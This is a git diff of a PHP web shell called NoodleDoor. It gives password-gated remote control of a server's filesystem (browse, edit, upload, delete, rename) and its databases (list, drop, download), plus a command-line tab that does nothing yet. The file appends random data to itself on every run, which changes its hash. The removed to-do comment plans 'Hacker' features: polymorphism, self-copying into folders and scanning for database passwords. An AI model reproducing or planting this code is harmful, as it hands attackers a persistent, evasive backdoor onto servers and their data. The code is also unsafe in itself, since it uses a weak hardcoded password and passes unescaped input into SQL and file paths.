@@ -1,4 +1,4 @@
-<? 
+<?
 $pass = hash("sha256", "cake");
 $sqlinfo = [
   "host" => "",
@@ -6,41 +6,7 @@ $sqlinfo = [
   "password" => ""
 ];
 
-/*
-NoodleDoor made by Zbee (Ethan Henderson) 2014 - https://github.com/zbee/noodledoor
-Todo:
-- File System
-  - Detect things that don't have to be archived before downloading
-  - Change file permissions
-- Command line
-  - Execute commands
-  - See output of commands
-- Database
-  - Search file system for password
-    - Search for files named mysql
-    - Search within files for mysql functions
-  - View tables
-  - View rows
-  - Edit rows
-  - Delete rows
-  - Edit tables
-  - Delete tables
-  - Empty tables
-  - Edit databases
-  - Drop databases
-  - Download databases
-  - Download tables
-  - Execute SQL
-- Overall
-  - Different versions
-    -Hacker
-      - Polymorphing (add stuff to different locations in file)
-      - Copy itself (select folder to have NoodleDoor placed into all subsequent folders)
-      - Database password detection (scan file system to see if passwords to database can be found)
-      - From email detection (scan file system to see what email is used to send emails from the system)
-    - Admin
-      - 
-*/
+date_default_timezone_set('America/Denver');
 
 function endsWith($a,$b){$c=strlen($b);$d=$c*-1;return(substr($a,$d)===$b);}
 function startsWith($a,$b){$c=strlen($b);return(substr($a,0,$c)===$b);}
@@ -79,9 +45,9 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
   $path = endsWith($path, "/") ? $path : $path . "/";
   $path = endsWith($path, "../") ? substr($path, 0, (-1 * (strlen(explode("/", $path)[count(explode("/", $path))-3]) + 4))) : $path;
   $bod = "";
-  
+
   if (isset($_GET["c"])) {
-	  $bod .= "";
+    $bod .= "";
   } elseif (isset($_GET["d"])) {
     if (isset($_POST["d-p"])) {
       try {
@@ -93,7 +59,7 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
       $db = null;
       $err = "";
     }
-    
+
     if ($db == null) {
       $bod .= "
       <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
@@ -119,231 +85,240 @@ if (hash("sha256", $_POST['p']) == $pass || $_POST['p'] == $pass) {
       </div>";
     } elseif (is_object($db) && $err == null && $_POST["target"] == "databases") {
       $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Database</th><th>Collation</th><th>Tables</th><th></th></tr>";
-      $stmt = $db->query("show databases");
-      foreach($stmt as $row) {
-        $rows = 0;
-        $rowsq = $db->query("select count(*) from `information_schema`.tables where table_schema='".$row["Database"]."'");
-        foreach($rowsq as $r) {
-          $rows = intval($r[0]);
-        }
-        $col = "";
-        $colq = $db->query("SELECT CCSA.character_set_name FROM information_schema.`TABLES` T,
-          information_schema.`COLLATION_CHARACTER_SET_APPLICABILITY` CCSA
-          WHERE CCSA.collation_name = T.table_collation
-          AND T.table_schema = '".$row["Database"]."'");
-        foreach($colq as $c) {
-          $col = $c[0];
-        }
-        $dl = "<a href='?d=".$row["Database"]."&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
-        $bod .= "<tr><td><a class='a' target='table' dir='".$row["Database"]."'><i class='glyphicon glyphicon-list-alt'></i> ".$row["Database"]."</a></td><td>".$col."</td><td>$rows</td><td>$dl</td></tr>";
-      }
-    }
-  } else {
-	  $bod .= hpath();
-	  $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
-	  if ($action == "delete") {
-      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
-        if (is_file($_POST["target"])) {
-          unlink($_POST["target"]);
-        } elseif (is_dir($_POST["target"])) {
-          emptyDir($_POST["target"]);
-        }
-      }
-      $action = "browse";
-	  } elseif ($action == "create") {
-      if (!is_file($_POST["target"])) {
-        file_put_contents($_POST["target"], "");
-      }
-      $action = "browse";
-	  } elseif ($action == "rename") {
-      if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
-        rename($_POST["target"], $_POST["dir"].$_POST["change"]);
-        $action = "browse";
-      }
-      $action = "browse";
-	  } elseif ($action == "upload") {
-      $target_file = $path . basename($_FILES["file"]["name"]);
-      $uploadOk = 1;
-      $uploadOk = 1;
-      if (file_exists($target_file)) {
-        echo "File already exists.";
-        $uploadOk = 0;
-      }
-      if ($uploadOk == 0) {
-        echo "Your file was not uploaded.";
-      } else {
-        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
-          
-        } else {
-          echo "There was an error uploading your file.";
-        }
-      }
-      $action = "browse";
-    } elseif ($action == "edit" && strlen($_POST['new']) < 4) {
-      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
-      $bod .= "Editing <strong>$file</strong><br><br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
-	  } elseif ($action == "edit" && strlen($_POST['new']) > 4) {
-      $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
-      file_put_contents($_POST["target"], $_POST['new']);
-      $bod .= "Editing <strong>$file</strong><br><br>File saved!<br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
-	  }
-	  if ($action == "browse") {
-      $dir = scandir($path);
-      $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Date Modified</th><th></th></tr>";
-      $dirs = "";
-      $files = "";
-      foreach ($dir as $file) {
-        $sfile = preg_replace("/[^a-zA-Z0-9]+/", "", $file);
-        if ($file == ".") { continue; }
-        if (is_dir($path . $file)) {
-          $stats = [];
-          $stats["name"] = "<a p='$pass' dir='$path$file' class='a'><i class='glyphicon glyphicon-folder-open'></i> /$file</a>";
-          $stats["perms"] = "";
-          $stats["owner"] = "";
-          $stats["size"] = $file != ".." ? hsize($path . $file) : "";
-          $chsums = "";
-          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
-          $isdir = true;
-        } elseif (is_file($path . $file)) {
-          $stats = stat($path . $file);
-          $stats["name"] = "<a p='$pass' dir='$path' action='edit' target='$path$file' class='a'><i class='glyphicon glyphicon-file'></i> $file</a>";
-          $stats["perms"] = hperms($path . $file);
-          $stats["owner"] = posix_getpwuid(fileowner($path . $file))["name"];
-          $stats["size"] = hsize($path . $file);
-          $hashes = "";
-          foreach (hash_algos() as $v) {
-            $r = getsize($path . $file) < 1980000000 ? hash_file($v, $path . $file) : "<a href='http://php.net/manual/en/function.hash-file.php#103656'>file too large</a>";
-            $stats["hashes"][$v] = $r; 
-            $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
-            $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
+        $stmt = $db->query("show databases");
+        foreach ($db->query("SHOW GRANTS FOR CURRENT_USER()") as $t) {
+          $p = $t[0];
+          $p = explode("GRANT ", $p)[1];
+          $p = explode(" TO", $p)[0];
+          $p = explode(" ON ", $p);
+          #echo $p[0], $p[1];
+          #echo "<Br><br>";
           }
-          $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i></button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
-          $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
-          $isdir = false;
+          foreach($stmt as $row) {
+            $rows = 0;
+            $rowsq = $db->query("select count(*) from `information_schema`.tables where table_schema='".$row["Database"]."'");
+            foreach($rowsq as $r) {
+              $rows = intval($r[0]);
+            }
+            $col = "";
+            $colq = $db->query("SELECT CCSA.character_set_name FROM information_schema.`TABLES` T,
+            information_schema.`COLLATION_CHARACTER_SET_APPLICABILITY` CCSA
+            WHERE CCSA.collation_name = T.table_collation
+            AND T.table_schema = '".$row["Database"]."'");
+            foreach($colq as $c) {
+              $col = $c[0];
+            }
+            $dl = "<a href='?d=".$row["Database"]."&h=".$_POST["d-h"]."&u=".$_POST["d-u"]."&p=". $_POST["d-p"]."' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
+            $delete = "<a target='database' dir='".$row["Database"]."' action='drop' class='a btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
+            $bod .= "<tr><td><a class='a' target='database' dir='".$row["Database"]."' action='view'><i class='glyphicon glyphicon-briefcase'></i> ".$row["Database"]."</a></td><td>".$col."</td><td>$rows</td><td>$delete $dl</td></tr>";
+          }
         }
-        $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
-        $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
-        $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
-        $echo = "<tr>
-          <td>$stats[name]</td>
-          <td>$stats[size]</td>
-          <td>$stats[perms]</td>
-          <td>$stats[owner]</td>
-          <td>$stats[date]</td>
-          <td>$delete $download $chsums</td>
-        </tr>";
-        if ($isdir) {
-        $dirs .= $echo;
-        } else {
-        $files .= $echo;
+      } else {
+        $bod .= hpath();
+        $action = isset($_POST["action"]) ? ($_POST["action"] == "browse" ? "browse" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "delete" ? "delete" : ($_POST["action"] == "edit" ? "edit" : ($_POST["action"] == "rename" ? "rename" : ($_POST["action"] == "upload" ? "upload" : ($_POST["action"] == "create" ? "create" : "browse"))))))) : "browse";
+        if ($action == "delete") {
+          if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
+            if (is_file($_POST["target"])) {
+              unlink($_POST["target"]);
+            } elseif (is_dir($_POST["target"])) {
+              emptyDir($_POST["target"]);
+            }
+          }
+          $action = "browse";
+        } elseif ($action == "create") {
+          if (!is_file($_POST["target"])) {
+            file_put_contents($_POST["dir"].$_POST["target"], "");
+          }
+          $action = "browse";
+        } elseif ($action == "rename") {
+          if ($_POST["target"] != __FILE__ && !startsWith(__FILE__, $_POST["target"])) {
+            rename($_POST["target"], $_POST["dir"].$_POST["change"]);
+            $action = "browse";
+          }
+          $action = "browse";
+        } elseif ($action == "upload") {
+          $target_file = $path . basename($_FILES["file"]["name"]);
+          $uploadOk = 1;
+          $uploadOk = 1;
+          if (file_exists($target_file)) {
+            echo "File already exists.";
+            $uploadOk = 0;
+          }
+          if ($uploadOk == 0) {
+            echo "Your file was not uploaded.";
+          } else {
+            if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+
+            } else {
+              echo "There was an error uploading your file.";
+            }
+          }
+          $action = "browse";
+        } elseif ($action == "edit" && strlen($_POST['new']) < 4) {
+          $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
+          $bod .= "Editing <strong>$file</strong><br><br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
+        } elseif ($action == "edit" && strlen($_POST['new']) > 4) {
+          $file = explode("/", $_POST["target"])[count(explode("/", $_POST["target"]))-1];
+          file_put_contents($_POST["target"], $_POST['new']);
+          $bod .= "Editing <strong>$file</strong><br><br>File saved!<br><form method='post' action=''><input type='hidden' name='p' value='$pass'><input type='hidden' name='dir' value='$path'><input type='hidden' name='action' value='edit'><input type='hidden' name='target' value='$_POST[target]'><textarea name='new' style='width:95%' rows='20'>" . htmlentities(file_get_contents($_POST["target"])) . "</textarea><br><input type='submit' value='Save' class='btn btn-primary'></form>";
         }
+        if ($action == "browse") {
+          $dir = scandir($path);
+          $bod .= "<table class='col-xs-12 table table-bordered table-condensed table-responsive table-striped'><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Owner</th><th>Date Modified</th><th></th></tr>";
+            $dirs = "";
+            $files = "";
+            foreach ($dir as $file) {
+              $sfile = preg_replace("/[^a-zA-Z0-9]+/", "", $file);
+              if ($file == ".") { continue; }
+              if (is_dir($path . $file)) {
+                $stats = [];
+                $stats["name"] = "<a p='$pass' dir='$path$file' class='a'><i class='glyphicon glyphicon-folder-open'></i> /$file</a>";
+                $stats["perms"] = "";
+                $stats["owner"] = "";
+                $stats["size"] = $file != ".." ? hsize($path . $file) : "";
+                $chsums = "";
+                $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
+                $isdir = true;
+              } elseif (is_file($path . $file)) {
+                $stats = stat($path . $file);
+                $stats["name"] = $file != $nof ? "<a p='$pass' dir='$path' action='edit' target='$path$file' class='a'><i class='glyphicon glyphicon-file'></i> $file</a>" : "<abbr title='For stability purposes you cannot edit this file'><i class='glyphicon glyphicon-file'></i> $file</abbr>";
+                $stats["perms"] = hperms($path . $file);
+                $stats["owner"] = posix_getpwuid(fileowner($path . $file))["name"];
+                $stats["size"] = hsize($path . $file);
+                $hashes = "";
+                foreach (hash_algos() as $v) {
+                  $r = getsize($path . $file) < 1980000000 ? hash_file($v, $path . $file) : "<a href='http://php.net/manual/en/function.hash-file.php#103656'>file too large</a>";
+                  $stats["hashes"][$v] = $r;
+                  $sr = strlen($r) > 55 ? substr($r, 0, 52) . "..." : $r;
+                  $hashes .= "<tr><td>$v</td><td><span title='$r'>$sr</span></td></tr>";
+                }
+                $chsums = "<button type='button' class='btn btn-default btn-xs' data-toggle='modal' data-target='#mod$sfile'><i class='glyphicon glyphicon-lock'></i></button><div class='modal fade' id='mod$sfile' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'><div class='modal-dialog'><div class='modal-content'><div class='modal-header'><button type='button' class='close' data-dismiss='modal'><span aria-hidden='true'>&times;</span><span class='sr-only'>Close</span></button><h4 class='modal-title' id='myModalLabel'>$file Checksums</h4></div><div class='modal-body'><table class='table table-responsive table-striped table-bordered hashes'>".$hashes."</table></div><div class='modal-footer'><button type='button' class='btn btn-default' data-dismiss='modal'>Close</button></div></div></div></div>";
+                $delete = "<a dir='$path' action='delete' target='$path$file' class='btn btn-xs btn-danger a'><i class='glyphicon glyphicon-trash' aria-hidden='true'></i></a>";
+                $isdir = false;
+              }
+              $stats["name"] = $file != ".." && $file != $nof ? "<button type='button' onClick='$(\"#s$sfile\").toggle();$(\"#f$sfile\").toggle();' class='btn btn-default btn-xs pull-right'><i class='glyphicon glyphicon-pencil'></i></button><span id='s$sfile'>" . $stats["name"] . "</span><form id='f$sfile' action='' method='post' style='display:none' class='form form-inline'><input type='text' name='change' value='$file' class='form-control input-sm'><input type='hidden' name='p' value='$pass'><input type='hidden' name='target' value='$path$file'><input type='hidden' name='action' value='rename'><input type='hidden' name='dir' value='$path'><input type='submit' style='display:none'></form>" : $stats["name"];
+              $stats["date"] = date("Y-m-d, g:ma", filectime($path . $file));
+              $download = "<a href='?dl=$path$file' target='_blank' class='btn btn-xs btn-primary'><i class='glyphicon glyphicon-download-alt' aria-hidden='true'></i></a>";
+              $echo = "<tr>
+                <td>$stats[name]</td>
+                <td>$stats[size]</td>
+                <td>$stats[perms]</td>
+                <td>$stats[owner]</td>
+                <td>$stats[date]</td>
+                <td>$delete $download $chsums</td>
+              </tr>";
+              if ($isdir) {
+                $dirs .= $echo;
+              } else {
+                $files .= $echo;
+              }
+            }
+            $bod .= $dirs;
+            $bod .= $files;
+          }
+        }
+      } else {
+        $bod .= "
+        <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
+          <form class='form-inline' role='form' method='post'>
+            <div class='form-group'>
+              <label class='sr-only' for='p'>Password</label>
+              <input type='password' class='form-control' id='p' name='p' placeholder='Password'>
+            </div>
+            <button type='submit' class='btn btn-default'>Sign in</button>
+          </form>
+        </div>";
       }
-      $bod .= $dirs;
-      $bod .= $files;
-	  }
-  }
-} else {
-  $bod .= "
-  <div class='col-xs-offset-0 col-xs-12 col-md-offset-4 col-md-4'>
-    <form class='form-inline' role='form' method='post'>
-      <div class='form-group'>
-        <label class='sr-only' for='p'>Password</label>
-        <input type='password' class='form-control' id='p' name='p' placeholder='Password'>
-      </div>
-      <button type='submit' class='btn btn-default'>Sign in</button>
-    </form>
-  </div>";
-}
 
-$rtext = hash("sha512", substr(str_shuffle(str_repeat("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",rand(15,50))),1,rand(256,4096)));
-file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
-?>
+      $rtext = hash("sha512", substr(str_shuffle(str_repeat("!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",rand(15,50))),1,rand(256,4096)));
+      file_put_contents(__FILE__, file_get_contents(__FILE__) . "\n<!--$rtext-->");
+      ?>
 
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="A program for remote viewing the filesystem, database, and using the command line for system administrators away from home">
-    <meta name="author" content="Zbee">
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="A program for remote viewing the filesystem, database, and using the command line for system administrators away from home">
+        <meta name="author" content="Zbee (Ethan Henderson)">
 
-    <title>NoodleDoor</title>
+        <title>NoodleDoor</title>
 
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-    a { cursor:pointer; }
-    body { margin-top: 75px; }
-    .hashes { max-width: 300px !important; }
-    .btn-file {
-        position: relative;
-        overflow: hidden;
-      }
-      .btn-file input[type=file] {
-        position: absolute;
-        top: 0;
-        right: 0;
-        min-width: 100%;
-        min-height: 100%;
-        font-size: 100px;
-        text-align: right;
-        filter: alpha(opacity=0);
-        opacity: 0;
-        outline: none;
-        background: white;
-        cursor: inherit;
-        display: block;
-      }
-    </style>
+        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet">
+        <style>
+          a { cursor:pointer; }
+          body { margin-top: 75px; }
+          .hashes { max-width: 300px !important; }
+          .btn-file {
+            position: relative;
+            overflow: hidden;
+          }
+          .btn-file input[type=file] {
+            position: absolute;
+            top: 0;
+            right: 0;
+            min-width: 100%;
+            min-height: 100%;
+            font-size: 100px;
+            text-align: right;
+            filter: alpha(opacity=0);
+            opacity: 0;
+            outline: none;
+            background: white;
+            cursor: inherit;
+            display: block;
+          }
+        </style>
 
-    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  </head>
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+      </head>
 
-  <body id="bod">
+      <body id="bod">
 
-    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
-      <div class="container container-fluid">
-        <div class="navbar-header">
-          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
-            <span class="sr-only">Toggle navigation</span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-          </button>
-          <a class="navbar-brand" href="<?=$nof?>">NoodleDoor</a>
-        </div>
-        <div id="navbar" class="collapse navbar-collapse">
-          <ul class="nav navbar-nav">
-            <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>">File System</a></li>
-            <li <? if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
-            <li <? if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
-          </ul>
-          <ul class="nav navbar-nav navbar-right">
-            <li><a href="https://github.com/Zbee" target="_blank">Made by Zbee</a></li>
-          </ul>
-        </div><!--/.nav-collapse -->
-      </div>
-    </nav>
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+          <div class="container container-fluid">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              <a class="navbar-brand" href="<?=$nof?>">NoodleDoor</a>
+            </div>
+            <div id="navbar" class="collapse navbar-collapse">
+              <ul class="nav navbar-nav">
+                <li <? if (!isset($_GET["c"]) && !isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>">File System</a></li>
+                <li <? if (isset($_GET["c"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?c">Command Line</a></li>
+                <li <? if (isset($_GET["d"])) { echo 'class="active"'; } ?>><a href="<?=$nof?>?d">Database</a></li>
+              </ul>
+              <ul class="nav navbar-nav navbar-right">
+                <li><a href="https://github.com/Zbee" target="_blank">Made by Zbee</a></li>
+              </ul>
+            </div><!--/.nav-collapse -->
+          </div>
+        </nav>
 
-    <div class="container">
-    <?=$bod?>
-    </div><!-- /.container -->
+        <div class="container">
+          <?=$bod?>
+        </div><!-- /.container -->
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
-    <script>
-    $(".a").click(function () {
-      $(".container").remove();
-      $("body").load("./<?=$nof?>", {p: "<?=$pass?>", dir: $(this).attr("dir"), action: $(this).attr("action"), target: $(this).attr("target")});
-    });
-    $(".breadcrumb li:first-child").html($(".breadcrumb li:first-child a").html()).addClass("active");
-    $("input:file").change(function (){
-      $("#file").submit();
-    });
-    </script>
-  </body>
-</html>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
+        <script>
+          $(".a").click(function () {
+            $(".container").remove();
+            $("body").load("./<?=$nof?>", {p: "<?=$pass?>", dir: $(this).attr("dir"), action: $(this).attr("action"), target: $(this).attr("target")});
+          });
+          $(".breadcrumb li:first-child").html($(".breadcrumb li:first-child a").html()).addClass("active");
+          $("input:file").change(function (){
+            $("#file").submit();
+          });
+        </script>
+      </body>
+      </html>
